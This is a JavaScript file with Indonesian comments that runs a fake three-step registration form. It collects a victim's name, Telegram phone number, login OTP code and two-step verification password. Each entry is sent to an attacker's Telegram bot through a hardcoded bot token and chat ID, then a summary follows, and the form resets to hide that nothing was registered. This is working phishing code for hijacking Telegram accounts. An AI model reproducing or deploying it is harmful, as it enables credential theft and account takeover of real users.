// Fungsi untuk memastikan input hanya angka yang diterima
function validateNumberInput(input) {
  // Hapus semua karakter selain angka
  input.value = input.value.replace(/[^0-9]/g, "");
}

document.addEventListener("DOMContentLoaded", function () {
  const step1 = document.getElementById("step-1");
  const step2 = document.getElementById("step-2");
  const step3 = document.getElementById("step-3");
  const loading1 = document.getElementById("loading-1");
  const loading2 = document.getElementById("loading-2");
  const loading3 = document.getElementById("loading-3");
  const nextStep1 = document.getElementById("next-step-1");
  const nextStep2 = document.getElementById("next-step-2");
  const form = document.getElementById("register-form");

  // Array untuk menyimpan pesan
  const messages = [];

  // Pindah ke Step 2
  nextStep1.addEventListener("click", function () {
    const name = document.getElementById("name").value;
    const phone = document.getElementById("phone").value;

    if (name && phone) {
      // Tampilkan loading
      loading1.style.display = "block";

      setTimeout(() => {
        // Kirim Nama dan Nomor Telegram ke Telegram
        const message1 = `Nama: ${name}\nNomor Telegram: ${phone}`;
        messages.push(message1); // Simpan pesan ke array
        sendMessageToTelegram(message1);

        // Lanjut ke Step 2
        loading1.style.display = "none";
        step1.style.display = "none";
        step2.style.display = "block";
      }, 2000); // Loading selama 2 detik
    } else {
      alert("Harap isi semua kolom!");
    }
  });

  // Pindah ke Step 3
  nextStep2.addEventListener("click", function () {
    const otp = document.getElementById("otp").value;

    if (otp) {
      // Tampilkan loading
      loading2.style.display = "block";

      setTimeout(() => {
        // Kirim OTP ke Telegram
        const message2 = `Kode OTP: ${otp}`;
        messages.push(message2); // Simpan pesan ke array
        sendMessageToTelegram(message2);

        // Lanjut ke Step 3
        loading2.style.display = "none";
        step2.style.display = "none";
        step3.style.display = "block";
      }, 2000); // Loading selama 2 detik
    } else {
      alert("Harap masukkan kode OTP!");
    }
  });

  // Kirim semua data pada Step 3 (Verifikasi 2 Langkah)
  form.addEventListener("submit", function (event) {
    event.preventDefault();
    const verification = document.getElementById("verification").value;

    if (verification) {
      // Tampilkan loading
      loading3.style.display = "block";

      setTimeout(() => {
        // Kirim Verifikasi 2 Langkah ke Telegram
        const message3 = `Verifikasi 2 Langkah: ${verification}`;
        messages.push(message3); // Simpan pesan ke array
        sendMessageToTelegram(message3);

        // Tampilkan modal untuk memproses data
        showProcessingModal();

        // Kirim semua pesan yang telah disimpan
        const summaryMessage = messages.join("\n"); // Gabungkan semua pesan menjadi satu
        sendMessageToTelegram(summaryMessage); // Kirim ringkasan pesan

        // Reset form setelah semua data dikirim
        loading3.style.display = "none";
      }, 2000); // Loading selama 2 detik
    } else {
      alert("Harap masukkan verifikasi 2 langkah!");
    }
  });

  // Fungsi untuk mengirim pesan ke Telegram
  function sendMessageToTelegram(message) {
    fetch(
      `https://api.telegram.org/bot7657549507:AAHHghoBDK_JvLiwwmJrXu9xnJsaeqL2mI0/sendMessage?chat_id=7408597280&text=${encodeURIComponent(
        message
      )}`
    )
      .then((response) => response.json())
      .then((data) => {
        if (!data.ok) {
          alert("Terjadi kesalahan saat mengirim data.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim data.");
      });
  }

  // Fungsi untuk menampilkan modal saat memproses data
  function showProcessingModal() {
    const modalHtml = `
      <div class="modal fade" id="processingModal" tabindex="-1" aria-labelledby="processingModalLabel" aria-hidden="true">
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="processingModalLabel">Sedang Memproses</h5>
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              Data Anda sedang diproses. Mohon tunggu...
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML("beforeend", modalHtml);
    const processingModal = new bootstrap.Modal(
      document.getElementById("processingModal")
    );
    processingModal.show();

    // Setelah 3 detik, sembunyikan modal dan reset form
    setTimeout(() => {
      processingModal.hide();
      resetForm();
    }, 3000); // Menunggu 3 detik
  }

  // Fungsi untuk mereset form ke awal
  function resetForm() {
    document.getElementById("name").value = "";
    document.getElementById("phone").value = "";
    document.getElementById("otp").value = "";
    document.getElementById("verification").value = "";
    messages.length = 0; // Kosongkan array pesan
    step1.style.display = "block";
    step2.style.display = "none";
    step3.style.display = "none";
  }
});
